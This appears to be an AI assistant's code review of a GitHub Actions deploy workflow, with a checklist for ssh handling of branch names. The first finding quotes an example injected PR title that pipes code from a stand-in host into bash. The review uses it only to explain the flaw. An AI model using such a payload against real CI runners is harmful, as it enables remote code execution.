I couldn't find a deploy script that builds an ssh command, so I haven't reviewed that. A grep for `ssh ` across the repo returned nothing. The only shell script is `scripts/backup.sh`, and the only deploy-related files are `.github/workflows/deploy.yml` and `k8s/deployment.yml`. The script may be on another branch, uncommitted, or in a different repo. Can you give me its path?

I did read `.github/workflows/deploy.yml`, and it has two problems you should fix before CI uses it:

1. **Script injection (line 14).** `run: echo "Title is ${{ github.event.pull_request.title }}"` pastes the PR title into the shell script before the shell runs. Anyone who can open a PR can set a title like `"; curl evil.sh | bash; "` and run commands on the runner. This is the same flaw as interpolating a branch name into an ssh command string. The fix is to pass the value through an environment variable and quote it:
   ```yaml
   env:
     PR_TITLE: ${{ github.event.pull_request.title }}
   run: printf 'Title is %s\n' "$PR_TITLE"
   ```
2. **Over-broad token (line 7).** `permissions: write-all` gives the job's `GITHUB_TOKEN` write access to everything, and the job runs on `pull_request`. Together with the injection above, that is a much larger exposure. Use `permissions: contents: read` and add only what the job needs.

When you send me the deploy script, these are the things I'll check in its ssh handling:
- **Remote command string.** `ssh host "cd /srv && git checkout $BRANCH"` makes the remote shell re-parse the branch name. Git allows branch names containing `;`, `$()`, backticks and spaces.
- **Branch validation.** Check the name against an allowlist such as `^[A-Za-z0-9._/-]+$` and reject anything else, rather than trying to escape it. Also reject names that start with `-`, which ssh and git would read as options.
- **Quoting for the remote shell.** If the name has to cross ssh, use `printf %q`, or send it on stdin or as a fixed script argument (`ssh host bash -s -- "$branch" < remote.sh`).
- **Strict mode and cleanup.** `set -Eeuo pipefail`, plus a trap for any temporary files or keys.
- **Host and key handling.** Check that `StrictHostKeyChecking` isn't disabled and that no key is passed on the command line.
